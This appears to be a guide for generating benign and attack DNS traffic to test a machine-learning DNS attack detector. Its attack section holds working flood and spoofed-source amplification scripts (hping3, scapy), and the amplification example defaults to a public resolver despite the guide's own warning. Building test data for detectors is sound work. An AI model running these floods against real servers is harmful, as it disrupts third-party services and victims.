# DNS Traffic Generation Guide for Model Testing

This guide provides methods to generate **DNS attack traffic** and **normal DNS traffic** for testing your XGBoost model.

---

## Quick Reference

| Traffic Type | Tool | Best For |
|-------------|------|----------|
| **Normal DNS** | `dnsperf` | Realistic benign queries |
| **DNS Flood** | `hping3` | Volumetric attacks |
| **Amplification** | `dnschef` + amplification script | Reflection attacks |
| **Custom** | Python scripts (provided below) | Controlled testing |

---

## Method 1: Generate Normal/Benign DNS Traffic

### Option A: Using `dnsperf` (Recommended)

**Install**:
```bash
# Windows (via WSL or use dnspython alternative)
# Linux/WSL
sudo apt-get install dnsperf

# macOS
brew install dnsperf
```

**Create query file** (`queries.txt`):
```
google.com A
youtube.com A
facebook.com A
amazon.com A
wikipedia.org A
reddit.com A
twitter.com A
instagram.com A
netflix.com A
stackoverflow.com A
```

**Run benign traffic**:
```bash
# Low rate (10 queries/second) - Very benign
dnsperf -s 8.8.8.8 -d queries.txt -Q 10 -l 60

# Medium rate (50 queries/second) - Normal browsing
dnsperf -s 8.8.8.8 -d queries.txt -Q 50 -l 60

# High rate (200 queries/second) - Heavy browsing/streaming
dnsperf -s 8.8.8.8 -d queries.txt -Q 200 -l 60
```

### Option B: Python Script for Normal Traffic

```python
# save as: generate_normal_dns.py
import socket
import dns.resolver
import time
import random

domains = [
    'google.com', 'youtube.com', 'facebook.com', 'amazon.com',
    'wikipedia.org', 'reddit.com', 'twitter.com', 'netflix.com',
    'github.com', 'stackoverflow.com', 'linkedin.com', 'microsoft.com'
]

def generate_normal_traffic(qps=10, duration=60):
    """Generate normal DNS queries at specified rate"""
    resolver = dns.resolver.Resolver()
    resolver.nameservers = ['8.8.8.8']  # Use Google DNS
    
    queries_sent = 0
    start_time = time.time()
    
    print(f"Generating normal DNS traffic: {qps} QPS for {duration} seconds")
    
    while time.time() - start_time < duration:
        domain = random.choice(domains)
        try:
            # Realistic query types
            qtype = random.choice(['A', 'A', 'A', 'AAAA'])  # Mostly A records
            answers = resolver.resolve(domain, qtype)
            queries_sent += 1
            
            if queries_sent % 100 == 0:
                print(f"Sent {queries_sent} queries...")
            
            # Rate limiting
            time.sleep(1.0 / qps)
            
        except Exception as e:
            continue
    
    elapsed = time.time() - start_time
    print(f"\nCompleted: {queries_sent} queries in {elapsed:.2f}s ({queries_sent/elapsed:.2f} QPS)")

if __name__ == '__main__':
    # Generate normal traffic at 50 QPS for 60 seconds
    generate_normal_traffic(qps=50, duration=60)
```

**Install dependencies**:
```bash
pip install dnspython
```

**Run**:
```bash
python generate_normal_dns.py
```

---

## Method 2: Generate DNS Attack Traffic

### Attack Type 1: DNS Query Flood

**Using `hping3`** (Linux/WSL):
```bash
# Install
sudo apt-get install hping3

# DNS flood to target DNS server (use your own test server!)
# WARNING: Only use on networks/servers you own or have permission!
sudo hping3 -c 10000 -d 120 -S -w 64 -p 53 --flood --rand-source <TARGET_DNS_IP>
```

**Using Python**:
```python
# save as: dns_flood_attack.py
import socket
import random
import time
from scapy.all import *

def dns_flood(target_dns, duration=60, rate=1000):
    """
    Generate DNS query flood
    WARNING: Only use on test networks you control!
    """
    print(f"WARNING: Generating DNS flood attack")
    print(f"Target: {target_dns}, Rate: {rate} QPS, Duration: {duration}s")
    print("Press Ctrl+C to stop...")
    
    queries_sent = 0
    start_time = time.time()
    
    # Random subdomain generation for water torture
    def random_subdomain():
        length = random.randint(5, 15)
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
    
    try:
        while time.time() - start_time < duration:
            # Generate random query (DNS Water Torture style)
            subdomain = random_subdomain()
            domain = f"{subdomain}.example.com"
            
            # Create DNS query packet
            pkt = IP(dst=target_dns) / UDP(dport=53) / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype='A')
            )
            
            # Send packet
            send(pkt, verbose=0)
            queries_sent += 1
            
            if queries_sent % 1000 == 0:
                print(f"Sent {queries_sent} attack queries...")
            
            # Rate control
            if rate < 10000:
                time.sleep(1.0 / rate)
            
    except KeyboardInterrupt:
        print("\n\nStopped by user")
    
    elapsed = time.time() - start_time
    print(f"\nAttack complete: {queries_sent} queries in {elapsed:.2f}s ({queries_sent/elapsed:.2f} QPS)")

if __name__ == '__main__':
    # CHANGE THIS to your test DNS server IP
    TARGET_DNS = "192.168.1.1"  # Your local DNS or test server
    
    # Generate flood at 1000 QPS for 30 seconds
    dns_flood(TARGET_DNS, duration=30, rate=1000)
```

**Install dependencies**:
```bash
pip install scapy
```

**Run** (requires admin/sudo):
```bash
# Windows (run as Administrator)
python dns_flood_attack.py

# Linux
sudo python3 dns_flood_attack.py
```

### Attack Type 2: DNS Amplification

```python
# save as: dns_amplification_attack.py
from scapy.all import *
import random
import time

def dns_amplification(target_ip, dns_server, duration=30):
    """
    Simulate DNS amplification attack
    Sends queries for large responses (ANY, TXT records)
    WARNING: Only use on test networks!
    """
    print(f"WARNING: Generating DNS amplification attack")
    print(f"Spoofed source: {target_ip}, DNS server: {dns_server}")
    
    queries_sent = 0
    start_time = time.time()
    
    # Domains known for large responses
    amp_domains = [
        'google.com',
        'facebook.com',
        'cloudflare.com'
    ]
    
    try:
        while time.time() - start_time < duration:
            domain = random.choice(amp_domains)
            
            # Create amplification query (ANY type for large response)
            pkt = IP(src=target_ip, dst=dns_server) / UDP(dport=53) / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype='ANY')  # ANY queries return large responses
            )
            
            send(pkt, verbose=0)
            queries_sent += 1
            
            if queries_sent % 100 == 0:
                print(f"Sent {queries_sent} amplification queries...")
            
            time.sleep(0.01)  # 100 QPS
            
    except KeyboardInterrupt:
        print("\n\nStopped by user")
    
    elapsed = time.time() - start_time
    print(f"\nAttack complete: {queries_sent} queries in {elapsed:.2f}s")

if __name__ == '__main__':
    # CHANGE THESE to your test environment
    TARGET_IP = "192.168.1.100"  # Victim IP (spoofed)
    DNS_SERVER = "8.8.8.8"  # Open DNS resolver
    
    dns_amplification(TARGET_IP, DNS_SERVER, duration=30)
```

---

## Recommended Testing Workflow

### Step 1: Capture Traffic with Your Tool

**Start capture**:
```powershell
cd C:\Users\shenal\Downloads\reseraach\CIC-Flow-Meter-DNS\target
java -jar net-traffic-analysis-1.0-SNAPSHOT.jar -i "Wi-Fi" -o "test_normal.csv"
```

### Step 2: Generate Traffic (in another terminal)

**Normal traffic**:
```bash
python generate_normal_dns.py
```

**Attack traffic**:
```bash
python dns_flood_attack.py
```

### Step 3: Stop Capture
Press `Ctrl+C` in the Java tool terminal

### Step 4: Fix CSV and Test
```bash
python final_fix_csv.py  # If needed
python test_saved_model.py
```

---

## Safe Testing Environment Setup

### Option 1: Local DNS Server (Recommended)

**Install `dnsmasq` (lightweight DNS server)**:
```bash
# Linux/WSL
sudo apt-get install dnsmasq

# Start
sudo dnsmasq -d --no-daemon --log-queries
```

**Configure to use local DNS**: Point attack scripts to `127.0.0.1`

### Option 2: Virtual Network

Use VirtualBox/VMware to create isolated network:
1. Create 3 VMs: Attacker, DNS Server, Victim
2. Put on isolated virtual network (NAT or Host-Only)
3. Run attacks without affecting real network

---

## Expected Model Predictions

| Traffic Type | Expected Prediction | Confidence |
|-------------|-------------------|------------|
| Normal (10-50 QPS) | BENIGN | >80% |
| Heavy browsing (100-200 QPS) | BENIGN or ATTACK | 50-70% |
| DNS Flood (>500 QPS) | ATTACK | >95% |
| Amplification (high amp factor) | ATTACK | >99% |
| Random subdomains (water torture) | ATTACK | >90% |

---

## Troubleshooting

### "Permission denied" errors
- Run Python scripts with admin/sudo for raw socket access
- Or use `dnsperf` which doesn't need special permissions

### "No route to host"
- Check firewall settings
- Verify DNS server IP is reachable
- Use local DNS server (127.0.0.1) for testing

### Traffic not captured
- Verify network interface name in Java tool
- Check if DNS port 53 traffic is being generated
- Use Wireshark to confirm traffic exists

---

## Quick Test Commands

### Generate and test in one go:

**Terminal 1** (Capture):
```powershell
java -jar net-traffic-analysis-1.0-SNAPSHOT.jar -i "Wi-Fi" -o "attack_test.csv"
```

**Terminal 2** (Generate attack for 30 seconds):
```powershell
timeout 30 python dns_flood_attack.py
```

**Terminal 1** (Stop with Ctrl+C, then test):
```powershell
python final_fix_csv.py
python test_saved_model.py
```

---

## Safety Reminders

⚠️ **CRITICAL WARNINGS**:
1. Only generate attack traffic on networks you own/control
2. Do NOT target public DNS servers (8.8.8.8, 1.1.1.1) with attacks
3. Use local DNS server or test lab environment
4. Some ISPs may detect/block attack traffic
5. Check local laws regarding network testing

✅ **Recommended**: Set up isolated virtual network for testing

---

**Next Steps**: Run normal traffic first to verify capture works, then test with attacks!
